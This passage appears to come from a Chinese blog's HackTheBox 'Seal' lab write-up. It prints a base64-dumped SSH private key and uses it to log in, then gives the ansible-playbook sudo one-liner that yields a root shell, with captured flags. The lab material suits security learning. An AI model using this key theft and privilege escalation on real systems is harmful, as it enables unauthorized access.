id_rsa | <span class="hljs-built_in">base64</span><br><span class="hljs-built_in">cat</span> id_rsa | <span class="hljs-built_in">base64</span><br>LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFzM2tJU0NlZGRLYWNDUWhWY3BUVFZjTHhNOXEyaVFLemk5aHNubEV0MFo3a2NoWnJTWnNHCkRrSUQ3OWcvNFhybm9LWG0ydWQwZ21aeGRWSlVBUTMzS2czTms2Y3pESTB3ZXZyL1lmQnBDa1htNXJzbmZvNXpqRXVWR28KTVRKaE5aOGlPdTdzQ0RaWkE2c1g0OE9GdHVGNnp1VWdGcXpIcmRIclI0K1lGYXdnUDhPZ0o5TldrYXBtbXRra3hjRWJGNApuMSt2L2wrNzRrRW10aTdqVGlUU1FnUHIvVG9UZHZRdHcxMitZYWZWdEVrQi84aXBFbkFJb0QvQjZKT09kNHBQVE5nWDhSCk1QV0g5M21TdHJxYmxuTU9XSnRvOVlwTHhoTTQzdjlJNkVVamU4Z3AvRWNTcnZIREJlekVFTXpaUytJYmNQK2hudzVlbGEKZHVMbXRkVFNNUFRDV2twSTloWEhOVTluamNEK1RSUi9BOTBWSHFkcUxsYUprZ0M5enBSWEIyMDk2RFZ4RllkT0xjamdlTgozcmNuQ0FFaFE3NVZzRUhYRS9OSGdPOHpqRDJvM2NuQU96c015UXJxTlh0UGErcUhqVkRjaC9UMVRqU2xDV3hBRkh5L09JClB4QnVwRS9rYkVveTErZEpIdVIrZ0VwNnlNbGZxRnlFVmhVYkRxeWhBQUFGZ09BeHJ0WGdNYTdWQUFBQUIzTnphQzF5YzIKRUFBQUdCQUxONUNFZ25uWFNtbkFrSVZYS1UwMVhDOFRQYXRva0NzNHZZYko1UkxkR2U1SElXYTBtYkJnNUNBKy9ZUCtGNgo1NkNsNXRybmRJSm1jWFZTVkFFTjl5b056Wk9uTXd5Tk1IcjYvMkh3YVFwRjV1YTdKMzZPYzR4TGxScURFeVlUV2ZJanJ1CjdBZzJXUU9yRitQRGhiYmhlczdsSUJhc3g2M1I2MGVQbUJXc0lEL0RvQ2ZUVnBHcVpwclpKTVhCR3hlSjlmci81ZnUrSkIKSnJZdTQwNGswa0lENi8wNkUzYjBMY05kdm1HbjFiUkpBZi9JcVJKd0NLQS93ZWlUam5lS1QwellGL0VURDFoL2Q1a3JhNgptNVp6RGxpYmFQV0tTOFlUT043L1NPaEZJM3ZJS2Z4SEVxN3h3d1hzeEJETTJVdmlHM0Qvb1o4T1hwV25iaTVyWFUwakQwCndscEtTUFlWeHpWUFo0M0EvazBVZndQZEZSNm5haTVXaVpJQXZjNlVWd2R0UGVnMWNSV0hUaTNJNEhqZDYzSndnQklVTysKVmJCQjF4UHpSNER2TTR3OXFOM0p3RHM3RE1rSzZqVjdUMnZxaDQxUTNJZjA5VTQwcFFsc1FCUjh2emlEOFFicVJQNUd4SwpNdGZuU1I3a2ZvQktlc2pKWDZoY2hGWVZHdzZzb1FBQUFBTUJBQUVBQUFHQUp1QXN2eFIxc3ZMMEViRFFjWVZ6VWJ4c2F3Ck1SVHhSYXVBd2xXeFhTaXZtVUduSm93d1RsaHVrZDJUSktoQmtQVzJrVVhJNk9Xa0MraXQ5T2V2di9jZ2lUWTB4d2JtT1gKQU15bHpSMDZZNU5JdE9vTllBaVRWdXg0VzhuUXVBcXhEUlpWcWpuaFBIckZlL1VRTGxUL3Yva2hsbm5nSEhMd3V0bjA2bgpidXBlQWZIcUd6WllKaTEzRkV1OC8ya1k2VHhsSC8yV1g3V01Nc0U0S01rankvbnJVaXhUTnpTKzBRaktVZHZDR1MxUDZMCmhGQis3eE45aXRqRXRCQmlaOXA1ZmVYd0JuNmFxSWdTRnlRSmxVNGUyQ1VGVWQ1UHJraUhMZjhtWGpKSkdNSGJIbmUycnUKcDBPWFZxanhBVzNxaWZLM1VFcDBiQ0luSlM3VUo3dFI5Vkk1MlF6US9SZkdKK0NzaHRxQmVFaW9hTGZQaTlDeFo2TE40UwoxenJpYXNKZEF6QjNIYnU0TlZWT2MveGtIOW1USlEza2Y1UkdTY0NZYWJsTGpVQ09xMDVhUFZxaGFXNnR5RGFmOG9iODVxCi9zK0NZYU9yYmkxWWh4aE9NOG81TXZOenNyUzhlSWsxaFRPZjBtc0tFSjVtV28rUmZoaENqOUZURlNxeUs3OWhRQkFBQUEKd1FDZmhjNXNpK1VVK1NIZlFCZzlsbThkMVlBZm5YRFA1WDF3anorR0Z3MTVsR2JnMXg0WUJnSXowQThQaWpwWGVWdGh6MgppYis3M3ZkTlpnVUQ5dDJCMFRpd29nTXMyVWx4dVRndVdpdmI5SnhBWmRienI4Um8xWEJDVTZ3dHpRYjRlMjJsaWNpZmFhCldTL28xbVJIT09QOTBqZnBQT2J5OFdabkR1TG00K0lCenZjSEZRYU83TFVHMm9QRXdUbDBpaTdTbWFYZGFoZENmUXdrTjUKTmtmTFhmVXFnNDFuRE9mTHlSQ3FOQVh1K3BFYnA4VUlVbDJ0cHRDSm8vekR6VnNJNEFBQURCQU9Vd1pqYVptNncvRUdQNgpLWDZ3MjhZL3NhLzBoUGhMSnZjdVpiT3JnTWorOEZsU2NlVnpuQTNnQXVDbEpOTm4walBaMFJNV1VCOTc4ZXU0SjNzZTVPCnBsVmFMR3J6VDg4SzBuUWJ2TTNLaGNCanNPeENwdXd4VWxUckppNitpOVd5UEVOb3ZFV1U1Yzc5V0pzVEtqSXBNT21FYk0Ka0NidFRSYkh0dUt3dVNlOE9XTVRGMitCbXQwbk1RYzlJUkQxSUkyVHhORExOR1ZxYnE0ZmhCRVc0Y28xWDA3NkNVR0RueAo1SzVIQ2plbDk1Yis5SDJaWG5XOUxlTGQ4RzdvRlJVUUFBQU1FQXlIZkRaS2t1MzZJWW1OZURFRWNDVXJPOU5sME5sZTdiClZkM0VKdWc0V3NsL24xVXFDQ0FCUWpoV3BXQTNvbmlPWHdtYkFzdkZpb3g1RWRCWXpyNnZzV21lbGVPUVRSdUpDYnc2bGMKWUc2dG13VmVUYmhreWNYTWJFVmVJc0cwYTQyWWoxeXdycTVHeVhLWWFGcjNEbkRJVGNxTGJkeElJRWRIMXZyUmpZeW5WTQp1ZVg3YXE5cElYaGNHVDZNOUNHVUpqeUVrdk9yeCtIUkQ0VEt1MGxHY08zTFZBTkdQcVNma3M0cjVFYTRMaVo0UTRZbk9KCnU4S3FPaURWcndtRkpSQUFBQUNXeDFhWE5BYzJWaGJBRT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==<br>tomcat@seal:/tmp/dashboard/uploads/.ssh$<br><br><span class="hljs-built_in">echo</span> LS0tLS......EtFWS0tLS0tCg== | <span class="hljs-built_in">base64</span> -d &gt; id_rsa<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">chmod</span> 600 id_rsa <br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh luis@10.10.10.250 -i id_rsa        <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.250 (10.10.10.250)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:CK0IgtHX4isQwWAPna6oD88DnRAM9OacxQExxLSnlL0.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.250<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Sun 21 Jan 2024 02:55:30 PM UTC</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:           0.05</span><br><span class="hljs-string">  Usage of /:            46.6% of 9.58GB</span><br><span class="hljs-string">  Memory usage:          26%</span><br><span class="hljs-string">  Swap usage:            0%</span><br><span class="hljs-string">  Processes:             165</span><br><span class="hljs-string">  Users logged in:       0</span><br><span class="hljs-string">  IPv4 address for eth0: 10.10.10.250</span><br><span class="hljs-string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:9cd9</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">0 updates can be applied immediately.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Fri May  7 07:00:18 2021 from 10.10.14.2</span><br><span class="hljs-string">luis@seal:~$ id</span><br><span class="hljs-string">uid=1000(luis) gid=1000(luis) groups=1000(luis)</span><br><span class="hljs-string">luis@seal:~$ </span><br></code></pre></td></tr></table></figure>
+
+<p>27、成功登录，接下来就是获取第一个flag信息了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">luis@seal:~$ <span class="hljs-built_in">ls</span><br>gitbucket.war  user.txt<br>luis@seal:~$ <span class="hljs-built_in">cat</span> user.txt<br>4923ddadf9345f6a0a97f56293c05978<br>luis@seal:~$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>28、查看下sudo配置情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">luis@seal:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> luis on seal:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User luis may run the following commands on seal:<br>    (ALL) NOPASSWD: /usr/bin/ansible-playbook *<br>luis@seal:~$ <br></code></pre></td></tr></table></figure>
+
+<p>29、这不就是有手就行的提权吗</p>
+<p><code>https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">luis@seal:~$ <br>luis@seal:~$ TF=$(<span class="hljs-built_in">mktemp</span>)<br>luis@seal:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[&#123;hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]&#125;]&#x27;</span> &gt;<span class="hljs-variable">$TF</span><br>luis@seal:~$ sudo ansible-playbook <span class="hljs-variable">$TF</span><br>[WARNING]: provided hosts list is empty, only localhost is available. Note that the<br>implicit localhost does not match <span class="hljs-string">&#x27;all&#x27;</span><br><br>PLAY [localhost] ************************************************************************<br><br>TASK [Gathering Facts] ******************************************************************<br>ok: [localhost]<br><br>TASK [shell] ****************************************************************************<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cat /root/root.txt</span><br>8ff1861d54ac0990d9a8cdbebcceecd2<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/358</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Seal-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/21/Seal-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/23/Forge-htb-writeup/" title="Forge-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Forge-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/15/Ophiuchi-htb-writeup/" title="Ophiuchi-htb-writeup">
+                        <span class="hidden-mobile">Ophiuchi-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
